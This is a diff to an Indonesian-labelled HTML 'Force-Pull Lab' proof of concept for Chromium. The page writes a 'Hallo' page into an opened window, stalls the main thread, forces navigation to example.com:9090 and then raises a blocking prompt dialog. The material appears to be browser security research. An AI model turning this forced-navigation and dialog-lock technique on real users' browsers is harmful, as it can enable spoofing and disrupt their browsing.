@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Chromium Aggressive Force-Pull Lab POC</title>
+    <title>Chromium Port 9090 Force-Pull Lab POC</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         :root {
@@ -83,9 +83,9 @@
 <body>
 
     <div class="wrapper">
-        <h2>Force-Pull Lab v5</h2>
-        <p>Injeksi DOM "Hallo" dengan Redundansi Navigasi Paksa ke Target Eksternal.</p>
-        <button id="launchBtn" class="btn-trigger">JALANKAN FORCE-PULL</button>
+        <h2>Port 9090 Force-Pull Lab</h2>
+        <p>Injeksi DOM "Hallo" dengan Redundansi Navigasi Paksa ke example.com:9090.</p>
+        <button id="launchBtn" class="btn-trigger">JALANKAN PORT 9090 PULL</button>
         <div id="logBox" class="logger">[System] Menunggu perintah eksekusi...</div>
     </div>
 
@@ -119,12 +119,12 @@
                     <!DOCTYPE html>
                     <html>
                     <head>
-                        <title>Forced Payload View</title>
+                        <title>Forced Port View</title>
                         <meta charset="utf-8">
                     </head>
                     <body style="background:#ffffff; color:#0f172a; text-align:center; padding-top:100px; font-family:sans-serif;">
                         <h1 style="font-size: 3.5rem; font-weight: 800; margin: 0; color: #1e293b;">Hallo</h1>
-                        <p style="color: #64748b; font-size: 1.1rem; margin-top: 10px;">Payload Render Aktif - Menunggu Tarikan Jaringan...</p>
+                        <p style="color: #64748b; font-size: 1.1rem; margin-top: 10px;">Payload Render Aktif - Menunggu Respon Port 9090...</p>
                     </body>
                     </html>
                 `);
@@ -133,32 +133,31 @@
 
                 // Memicu stresor ringan pada utas utama (main thread contention)
                 const startTick = performance.now();
-                while (performance.now() - startTick < 50) {
+                while (performance.now() - startTick < 40) {
                     Math.random() * Math.random();
                 }
 
-                // Vektor Redundansi Navigasi Paksa ke target eksternal (example.com)
+                // Vektor Redundansi Navigasi Paksa ke target port non-standar (example.com:9090)
                 setTimeout(() => {
-                    addLog("Mengeksekusi paksa tarikan navigasi ke example.com...");
+                    addLog("Mengeksekusi paksa tarikan navigasi ke example.com:9090...");
                     
                     try {
-                        // Menggunakan location.replace berlapis untuk memaksa penimpaan riwayat
-                        targetWin.location.replace("https://example.com");
+                        targetWin.location.replace("https://example.com:9090");
                     } catch (e1) {
                         addLog("Fallback location.href dipicu...", true);
-                        targetWin.location.href = "https://example.com";
+                        targetWin.location.href = "https://example.com:9090";
                     }
-                }, 80);
+                }, 60);
 
-                // Penguncian dialog modal opsional untuk menguji stabilitas utas
+                // Penguncian dialog modal untuk menguji stabilitas utas saat port merespons/gagal
                 setTimeout(() => {
                     addLog("Memverifikasi responsivitas utas target...");
                     try {
-                        targetWin.prompt("STRESS TEST LOCK", "State Verification");
+                        targetWin.prompt("PORT 9090 LOCK", "State Verification");
                     } catch (promptErr) {
                         addLog("Dialog modal dibatasi oleh sandboks.", true);
                     }
-                }, 250);
+                }, 200);
 
             } catch (err) {
                 addLog("CRITICAL EXCEPTION: " + err.message, true);
